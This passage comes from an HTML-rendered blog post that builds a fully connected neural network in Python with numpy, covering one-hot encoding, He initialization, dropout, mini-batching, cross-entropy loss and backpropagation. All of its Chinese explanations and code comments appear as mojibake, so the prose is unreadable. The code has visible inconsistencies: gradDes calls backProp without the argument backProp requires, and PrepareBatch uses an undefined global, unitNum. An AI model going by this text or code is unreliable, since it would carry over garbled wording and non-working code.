sigmoid(x))</span><br></pre></td></tr></table></figure>    </div></div><h3 id="æ•°æ®å¤„ç†å‡½æ•°"><a href="#æ•°æ®å¤„ç†å‡½æ•°" class="headerlink" title="æ•°æ®å¤„ç†å‡½æ•°"></a>æ•°æ®å¤„ç†å‡½æ•°</h3><p>ä¹‹å‰æåˆ°çš„<code>OneHot</code>å’Œæ’å…¥<code>bias</code></p><div class='spoiler collapsed'>    <div class='spoiler-title'>        Source    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">OneHot</span>(<span class="params">length, width, y</span>):</span></span><br><span class="line">    <span class="comment"># OneHot encoding</span></span><br><span class="line">    y = np.array(y).ravel()</span><br><span class="line">    r = np.zeros((length, width))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        r[i][<span class="built_in">int</span>(y[i])] = <span class="number">1.0</span></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddBias</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="comment"># åœ¨ç¬¬0åˆ—æ’å…¥å…¨ä¸º1çš„åˆ—</span></span><br><span class="line">    x = np.matrix(x)</span><br><span class="line">    <span class="keyword">return</span> np.c_[np.ones((x.shape[<span class="number">0</span>], <span class="number">1</span>)), x]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RemoveBias</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="comment"># å»æ‰ç¬¬ä¸€åˆ—</span></span><br><span class="line">    <span class="keyword">return</span> np.matrix(x)[:, <span class="number">1</span>:]</span><br></pre></td></tr></table></figure>    </div></div><h3 id="FCNN-class"><a href="#FCNN-class" class="headerlink" title="FCNN class"></a>FCNN class</h3><p>ä»¥ä¸‹å¼€å§‹å¡«å……<code>FCNN</code>ç±»</p><p>æ˜ç¡®ä¸€ä¸‹ç±»ä¸­çš„åŸºæœ¬å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCNN</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Init</span>(<span class="params">self, unitNum</span>)</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">PrepareBatch</span>(<span class="params">self, X, y, batchSize=<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">fit</span>(<span class="params">self, epoch, rate</span>)</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">gradDes</span>(<span class="params">self, rate</span>)</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">backProp</span>(<span class="params">self</span>)</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">forwardProp</span>(<span class="params">self</span>)</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">ClrTempResult</span>(<span class="params">self</span>)</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">predict</span>(<span class="params">self, X, y</span>)</span></span><br></pre></td></tr></table></figure><p>æ˜ç¡®ä¸€äº›æ¦‚å¿µ</p><ul><li>batchSizeï¼šå¦‚æœæ•´ä¸ªè¿‡å®Œä¸€éè®­ç»ƒé›†ä¸­çš„æ•°æ®æ‰æ›´æ–°ä¸€æ¬¡æƒé‡ï¼Œåˆ™æ›´æ–°é€Ÿåº¦è¿‡æ…¢ï¼Œæ•…å°†æ•°æ®é›†æ‹†åˆ†ä¸ºå¤šæ‰¹æ¥å¤„ç†ï¼ŒbatchSizeå°±æ˜¯ä¸€æ‰¹æ•°æ®æœ‰å¤šå°‘ä»½æ ·æœ¬</li><li>epochï¼šæ€»å…±è¦è¿‡å‡ éå®Œæ•´çš„æ•°æ®ï¼Œæ‰€ä»¥æƒé‡çš„æ›´æ–°æ¬¡æ•°å°±æ˜¯<code>epoch*N/batchSize</code>ï¼Œå…¶ä¸­<code>N</code>æ˜¯è®­ç»ƒé›†æ ·æœ¬æ€»é‡</li><li>backward Propagationï¼šåå‘ä¼ æ’­ï¼ŒæŒ‡é€šè¿‡æ¢¯åº¦æ¥è°ƒæ•´æƒé‡çš„è¿‡ç¨‹<strong>ï¼ˆé‡ç‚¹ï¼‰</strong></li><li>forward Propagationï¼šå‰å‘ä¼ æ’­ï¼ŒæŒ‡ä¼ å…¥æ ·æœ¬åå¾—åˆ°è¾“å‡ºç»“æœçš„è¿‡ç¨‹</li></ul><p>ä»¥ä¸Šæ¦‚å¿µè™½ç„¶åè¯æ˜¯åœ¨æœ¬æ–‡ä¸­ç¬¬ä¸€æ¬¡å‡ºç°ï¼Œä½†ç»“åˆä¸Šæ–‡éƒ½ä¸éš¾ç†è§£</p><p>è€Œè®­ç»ƒè¿‡ç¨‹ä¸­è¿˜æœ‰ä¸€ä¸ªç§°ä½œ<code>DropOut</code>çš„ä¼˜åŒ–æ–¹æ³•ï¼ŒæŒ‡çš„æ˜¯åœ¨è®­ç»ƒä¸­éšæœºåœ°ææ­»ä¸€äº›ç¥ç»å…ƒï¼Œå‰å‘ä¼ æ’­çš„æ—¶å€™ä¸ç»è¿‡ä»–ä»¬ï¼Œåå‘ä¼ æ’­çš„æ—¶å€™ä¹Ÿä¸æ›´æ–°ä»–ä»¬ï¼Œä»è€Œä½¿å¾—æ¨¡å‹æ›´å…·é²æ£’æ€§ï¼Œä¹Ÿå¯ä»¥æœ‰æ•ˆé¿å…æ¨¡å‹è¿‡æ‹Ÿåˆï¼ˆè¿‡æ‹Ÿåˆï¼šæ¨¡å‹æ³›åŒ–ä¸å¥½ï¼Œè®­ç»ƒé›†å’Œæµ‹è¯•é›†çš„è¯†åˆ«å‡†ç¡®ç‡ç›¸å·®è¿‡å¤§ï¼‰ï¼Œå…³äº<code>DropOut</code>ä¸ºä»€ä¹ˆèƒ½å¢å¼ºæ¨¡å‹é²æ£’æ€§ã€é¿å…è¿‡æ‹Ÿåˆçš„è¯´æ³•æœ‰å¾ˆå¤šï¼Œå»ºè®®è‡ªå·±æœï¼ˆæ‡’</p><p>ç„¶åæˆ‘ä»¬è‚¯å®šå¸Œæœ›æ¨¡å‹å¯ä»¥ä¿å­˜ä¸‹æ¥ï¼Œè‡³å°‘è®­ç»ƒå‡ºæ¥çš„æƒé‡å¾—èƒ½ä¿å­˜å§ï¼Œä¸ç„¶æ¯æ¬¡éƒ½å¾—é‡æ¥ä¸€é</p><p>æ‰€ä»¥å†è¡¥å‡ ä¸ªå‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCNN</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetDropOut</span>(<span class="params">self</span>)</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">SaveParameters</span>(<span class="params">self</span>)</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">LoadParameters</span>(<span class="params">self</span>)</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>backProp</code>çš„å…¬å¼æ¨å¯¼è¿™ä¸ªé‡ç‚¹é—®é¢˜æ”¾åˆ°ä¸‹é¢çš„æ¨¡å—æ¥è¯´ï¼Œè¿™é‡Œåˆ™å†æä¸€äº›å°ä¸€ç‚¹çš„é—®é¢˜</p><ul><li><p>æƒé‡çš„åˆå§‹åŒ–æ–¹æ³•</p><p>  é€‰æ‹©é”™è¯¯çš„æƒé‡åˆå§‹åŒ–æ–¹æ³•ä¼šå¯¼è‡´æ¢¯åº¦æ¶ˆå¤±ç­‰ä¸¥é‡é—®é¢˜ï¼Œå¯èƒ½å¯¼è‡´è®­ç»ƒæ ¹æœ¬æ— æ³•å¼€å§‹ï¼Œç”±äºæˆ‘é€‰æ‹©çš„æ˜¯<code>ReLU</code>ä½œä¸ºéšè—å±‚çš„æ¿€æ´»å‡½æ•°ï¼Œä½¿ç”¨äº†<code>He initialization</code>ï¼Œå…·ä½“ä¸ºä»€ä¹ˆè¿™æ ·çš„åˆå§‹åŒ–å¯¹<code>ReLU</code>ä¼šæ›´å‹å¥½åˆ™æ²¡æœ‰æ·±å…¥æ¢ç©¶</p></li><li><p>æ­£åˆ™é¡¹</p><p>  æœ‰ä¸€ç§é˜²æ­¢è¿‡æ‹Ÿåˆçš„æ–¹æ³•æ˜¯ï¼šåœ¨æŸå¤±å‡½æ•°ä¸­åŠ å…¥æœ‰å…³æƒé‡<code>w</code>çš„äºŒæ¬¡é¡¹ï¼Œè¿™æ ·åœ¨<code>dw</code>ä¸­å°±ä½“ç°åœ¨æ¯æ¬¡æ›´æ–°æƒé‡æ—¶æƒé‡éƒ½ä¼šè‡ªå‡ä¸€ç‚¹ç‚¹</p></li><li><p>DropOutçš„å…·ä½“å®ç°</p><p>  åˆ›å»ºä¸<code>w</code>åŒæ ·sizeçš„çŸ©é˜µï¼Œå°†æœ¬è½®ä¸­ææ­»çš„ç¥ç»å…ƒçš„è¡Œä¸åˆ—ç½®<code>0</code>ï¼Œå…¶ä»–ç½®<code>1</code>ï¼Œä¼ é€’æ—¶æŠŠ<code>w</code>æ¢æˆ<code>np.multiply(w,dropOut)</code>å³å¯</p></li></ul><div class='spoiler collapsed'>    <div class='spoiler-title'>        Source    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCNN</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Init</span>(<span class="params">self, unitNum, dropOutProb=[]</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        å®Œæˆä¸€äº›åˆå§‹åŒ–</span></span><br><span class="line"><span class="string">        unitNum: list æ¯ä¸€å±‚çš„ç¥ç»å…ƒæ•°é‡</span></span><br><span class="line"><span class="string">        dropOutProb: list é™¤äº†è¾“å‡ºå±‚ä»¥å¤–æ¯ä¸€å±‚çš„dropOutæ¦‚ç‡(0,1)</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        self.unitNum = unitNum</span><br><span class="line">        self.layerNum = <span class="built_in">len</span>(unitNum)</span><br><span class="line">        self.dropOutProb = dropOutProb <span class="keyword">if</span> dropOutProb <span class="keyword">else</span> [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.layerNum - <span class="number">1</span>)]</span><br><span class="line">        self.outLength = unitNum[-<span class="number">1</span>]</span><br><span class="line">        self.w = [<span class="number">0</span>]  <span class="comment"># 0 çš„ä½œç”¨ä»…ä¸ºå ä½</span></span><br><span class="line">        self.Z = [<span class="number">0</span>]</span><br><span class="line">        self.A = [<span class="number">0</span>]</span><br><span class="line">        self.cost = []</span><br><span class="line">        self.costTemp = []</span><br><span class="line">        self.dwNorm = []</span><br><span class="line">        self.dwNormTemp = []</span><br><span class="line">        <span class="comment"># He initializationï¼Œé’ˆå¯¹éšè—å±‚æ˜¯reLuæ¿€æ´»å‡½æ•°çš„æƒé‡åˆå§‹åŒ–æ–¹æ³•</span></span><br><span class="line">        <span class="comment"># æ­£ç¡®çš„æƒé‡åˆå§‹åŒ–æ–¹æ³•èƒ½ä¸€å®šç¨‹åº¦é¿å…æ¢¯åº¦æ¶ˆå¤±</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, self.layerNum - <span class="number">1</span>):</span><br><span class="line">            np.random.seed(i)  <span class="comment"># è®¾ç½®éšæœºæ•°ç§å­</span></span><br><span class="line">            self.w.append(np.matrix(np.random.randn(unitNum[i - <span class="number">1</span>] + <span class="number">1</span>, unitNum[i])) * np.sqrt(<span class="number">2</span> / unitNum[i]))</span><br><span class="line">            self.w[-<span class="number">1</span>][<span class="number">0</span>] = np.matrix(np.zeros((<span class="number">1</span>, unitNum[i]))) <span class="comment"># biasåç½®åˆå§‹åŒ–ä¸º0</span></span><br><span class="line">        <span class="comment"># æœ€åçš„æƒé‡åˆå§‹åŒ–å’Œä¹‹å‰çš„ä¸å¤ªä¸€æ ·ï¼Œéœ€è¦æ›´åŠ æ¥è¿‘0ï¼Œè¿™æ˜¯é’ˆå¯¹sigmoid/softMax</span></span><br><span class="line">        np.random.seed(self.layerNum - <span class="number">1</span>)</span><br><span class="line">        self.w.append(np.matrix(np.random.rand(unitNum[-<span class="number">2</span>] + <span class="number">1</span>, unitNum[-<span class="number">1</span>])))</span><br><span class="line">        self.w[-<span class="number">1</span>] = (self.w[-<span class="number">1</span>] - np.mean(self.w[-<span class="number">1</span>])) / np.std(self.w[-<span class="number">1</span>]) / <span class="number">100</span></span><br><span class="line">        self.w[-<span class="number">1</span>][<span class="number">0</span>] = np.matrix(np.zeros((<span class="number">1</span>, unitNum[-<span class="number">1</span>])))</span><br><span class="line">        self.ClrTempResult()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">PrepareBatch</span>(<span class="params">self, X, y, batchSize=<span class="number">0</span></span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        åˆ†å‰²è®­ç»ƒé›†å¹¶å®Œæˆä¸€äº›åˆå§‹åŒ–</span></span><br><span class="line"><span class="string">        batchSize: æ¯ä¸€æ‰¹æ ·æœ¬çš„æ•°é‡ï¼Œéœ€èƒ½è¢«æ ·æœ¬æ€»æ•°æ•´é™¤</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        N = X.shape[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> batchSize:</span><br><span class="line">            batchSize = N</span><br><span class="line">        <span class="keyword">if</span> N % batchSize:</span><br><span class="line">            print(<span class="string">&quot;# ERR: illegal batchSize&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.batchSize = batchSize</span><br><span class="line">        self.batchTime = <span class="built_in">int</span>(N / batchSize)</span><br><span class="line">        self.X = np.matrix(X)</span><br><span class="line">        self.y = OneHot(X.shape[<span class="number">0</span>], unitNum[-<span class="number">1</span>], y)</span><br><span class="line">        self.batchX = []</span><br><span class="line">        self.batchy = []</span><br><span class="line">        self.batchTime = <span class="built_in">int</span>(N / batchSize)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.batchTime):</span><br><span class="line">            <span class="comment"># mini-batchå¯ä»¥åŠ å¿«è®­ç»ƒé€Ÿåº¦</span></span><br><span class="line">            self.batchX.append(np.array(self.X[i * batchSize : (i + <span class="number">1</span>) * batchSize]))</span><br><span class="line">            self.batchy.append(self.y[i * batchSize : (i + <span class="number">1</span>) * batchSize])</span><br><span class="line">            print(<span class="string">&quot;\rPreparing: %.2f%%&quot;</span> % ((i + <span class="number">1</span>) / N * batchSize * <span class="number">100</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fit</span>(<span class="params">self, epoch, rate</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        epoch: int è®­ç»ƒè½®æ¬¡</span></span><br><span class="line"><span class="string">        rate: float å­¦ä¹ ç‡</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        N = self.X.shape[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(epoch):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(self.batchTime):</span><br><span class="line">                self.Z[<span class="number">0</span>] = self.batchX[j]</span><br><span class="line">                self.A[<span class="number">0</span>] = self.batchX[j]</span><br><span class="line">                self.y = self.batchy[j]</span><br><span class="line">                self.gradDes(rate)</span><br><span class="line">                self.ClrTempResult()</span><br><span class="line">                print(</span><br><span class="line">                    <span class="string">&quot;\rTotalProgress: %.2f%% BatchProgress: %.2f%%  &quot;</span></span><br><span class="line">                    % (((i + <span class="number">1</span>) / epoch * <span class="number">100</span>), ((j + <span class="number">1</span>) / N * self.batchSize * <span class="number">100</span>)),</span><br><span class="line">                    end=<span class="string">&quot;&quot;</span>,</span><br><span class="line">                )</span><br><span class="line">            <span class="comment"># è®°å½•ä¸€ä¸ªè½®æ¬¡ä¸‹çš„å¹³å‡æŸå¤±å‡½æ•°</span></span><br><span class="line">            self.cost.append(<span class="built_in">sum</span>(self.costTemp) / self.batchTime)</span><br><span class="line">            self.costTemp.clear()</span><br><span class="line">            <span class="comment"># è®°å½•ä¸€ä¸ªè½®æ¬¡ä¸‹çš„å¹³å‡dwçš„L2ï¼Œå³æ¨¡é•¿</span></span><br><span class="line">            self.dwNorm.append(np.<span class="built_in">sum</span>(self.dwNormTemp, axis=<span class="number">0</span>) / self.batchTime)</span><br><span class="line">            self.dwNormTemp.clear()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gradDes</span>(<span class="params">self, rate</span>):</span></span><br><span class="line">        self.backProp()</span><br><span class="line">        <span class="comment"># æ²¡æœ‰åŠ å…¥æ­£åˆ™é¡¹æƒ©ç½šï¼Œå› ä¸ºæœªå‘ç°è¿‡æ‹Ÿåˆç°è±¡ï¼ŒåŒæ—¶æ ·æœ¬è¶³å¤Ÿå¤šæ—¶å¯ä»¥ä¸åŠ å…¥æ­£åˆ™é¡¹</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        # ä¸€ç§è¾ƒä¸ºç®€å•çš„æŸå¤±å‡½æ•° J(Î¸)</span></span><br><span class="line"><span class="string">        J = np.sum(np.multiply(self.y-self.A[-1],self.y-self.A[-1]))/self.batchSize</span></span><br><span class="line"><span class="string">        # è¿™é‡Œä½¿ç”¨æ›´åŠ å¤æ‚çš„å¸¦æœ‰logçš„äº¤å‰ç†µå‡½æ•°</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        J = (-np.<span class="built_in">sum</span>(np.array(self.y) * np.log(self.A[-<span class="number">1</span>]) + np.array(<span class="number">1</span> - self.y) * np.log(<span class="number">1</span> - self.A[-<span class="number">1</span>])) / self.batchSize)</span><br><span class="line">        self.costTemp.append(J)</span><br><span class="line">        dwNt = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(self.w)):</span><br><span class="line">            dwNt.append(np.linalg.norm(self.dw[i]))</span><br><span class="line">            self.w[i] -= rate * self.dw[i]</span><br><span class="line">        self.dwNormTemp.append(dwNt)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetDropOut</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># è·å–dropOutçŸ©é˜µï¼Œæ ¹æ®ç»™å®šæ¦‚ç‡éšæœºå»æ‰ç¥ç»å…ƒ</span></span><br><span class="line">        index = []</span><br><span class="line">        prob = self.dropOutProb[<span class="number">0</span>]</span><br><span class="line">        num = <span class="number">0</span> <span class="keyword">if</span> <span class="keyword">not</span> prob <span class="keyword">else</span> <span class="built_in">int</span>(np.clip(np.random.randn() / <span class="number">50</span> + prob, <span class="number">0</span>, <span class="number">0.75</span>) * self.unitNum[<span class="number">0</span>])</span><br><span class="line">        index.append(np.random.choice(self.unitNum[<span class="number">0</span>], num, <span class="literal">False</span>))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, self.layerNum - <span class="number">1</span>):</span><br><span class="line">            prob = self.dropOutProb[i]</span><br><span class="line">            num = <span class="number">0</span> <span class="keyword">if</span> <span class="keyword">not</span> prob <span class="keyword">else</span> <span class="built_in">int</span>(np.clip(np.random.randn() / <span class="number">50</span> + prob, <span class="number">0</span>, <span class="number">0.75</span>) * self.unitNum[i])</span><br><span class="line">            index.append(np.random.choice(self.unitNum[i], num, <span class="literal">False</span>))</span><br><span class="line">            dropOutMat = np.ones((self.unitNum[i - <span class="number">1</span>], self.unitNum[i]))</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> index[i - <span class="number">1</span>]:</span><br><span class="line">                dropOutMat[j] = np.zeros((<span class="number">1</span>, self.unitNum[i]))</span><br><span class="line">            dropOutMat = np.transpose(dropOutMat)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> index[i]:</span><br><span class="line">                dropOutMat[j] = np.zeros((<span class="number">1</span>, self.unitNum[i - <span class="number">1</span>]))</span><br><span class="line">            dropOutMat = np.r_[np.ones((<span class="number">1</span>, self.unitNum[i])), np.transpose(dropOutMat)]</span><br><span class="line">            self.dropOut.append(np.matrix(dropOutMat))</span><br><span class="line">        dropOutMat = np.ones((self.unitNum[-<span class="number">2</span>], self.unitNum[-<span class="number">1</span>]))</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> index[-<span class="number">1</span>]:</span><br><span class="line">            dropOutMat[j] = np.zeros((<span class="number">1</span>, self.unitNum[-<span class="number">1</span>]))</span><br><span class="line">        dropOutMat = np.r_[np.ones((<span class="number">1</span>, self.unitNum[-<span class="number">1</span>])), dropOutMat]</span><br><span class="line">        self.dropOut.append(np.matrix(dropOutMat))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">backProp</span>(<span class="params">self, d_lossFunc, forward=<span class="literal">True</span>, dX=<span class="literal">False</span></span>):</span></span><br><span class="line">        <span class="comment"># æœ‰è¯¦ç»†æ¨å¯¼è¿‡ç¨‹</span></span><br><span class="line">        <span class="keyword">if</span> forward:</span><br><span class="line">            self.forwardProp()</span><br><span class="line">        self.dA[-<span class="number">1</span>] = d_lossFunc()</span><br><span class="line">        <span class="comment"># --- appaly derivative of SoftMax</span></span><br><span class="line">        self.dZ[-<span class="number">1</span>] = []</span><br><span class="line">        Zt = np.array(self.Z[-<span class="number">1</span>])</span><br><span class="line">        dAt = np.array(self.dA[-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.batchSize):</span><br><span class="line">            self.dZ[-<span class="number">1</span>].append(np.array(d_softMax(np.matrix(Zt[i])) *</span><br><span class="line">                                   np.matrix(dAt[i]).reshape((self.unitNum[-<span class="number">1</span>], <span class="number">1</span>))).ravel())</span><br><span class="line">        self.dZ[-<span class="number">1</span>] = np.matrix(self.dZ[-<span class="number">1</span>])</span><br><span class="line">        <span class="comment"># ---</span></span><br><span class="line">        dw = self.A[-<span class="number">2</span>].T * self.dZ[-<span class="number">1</span>]</span><br><span class="line">        db = np.<span class="built_in">sum</span>(self.dZ[-<span class="number">1</span>], axis=<span class="number">0</span>)</span><br><span class="line">        self.dw[-<span class="number">1</span>] = np.r_[db, dw] / self.batchSize</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(<span class="number">1</span>, self.layerNum - <span class="number">1</span>)):</span><br><span class="line">            self.dA[i] = RemoveBias(self.dZ[i + <span class="number">1</span>] * np.multiply(self.w[i + <span class="number">1</span>], self.dropOut[i]).T)</span><br><span class="line">            self.dZ[i] = np.multiply(d_relu(self.Z[i]), self.dA[i])</span><br><span class="line">            dw = self.A[i - <span class="number">1</span>].T * self.dZ[i]</span><br><span class="line">            db = np.<span class="built_in">sum</span>(self.dZ[i], axis=<span class="number">0</span>)</span><br><span class="line">            self.dw[i] = np.multiply(np.r_[db, dw] / self.batchSize, self.dropOut[i - <span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> dX:</span><br><span class="line">            self.dA[<span class="number">0</span>] = RemoveBias(self.dZ[<span class="number">1</span>] * np.multiply(self.w[<span class="number">1</span>], self.dropOut[<span class="number">0</span>]).T)</span><br><span class="line">            self.dZ[<span class="number">0</span>] = self.dA[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forwardProp</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.GetDropOut()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, self.layerNum - <span class="number">1</span>):</span><br><span class="line">            self.Z.append(AddBias(self.A[-<span class="number">1</span>]) * np.multiply(self.w[i], self.dropOut[i - <span class="number">1</span>]))</span><br><span class="line">            self.A.append(relu(self.Z[-<span class="number">1</span>]))</span><br><span 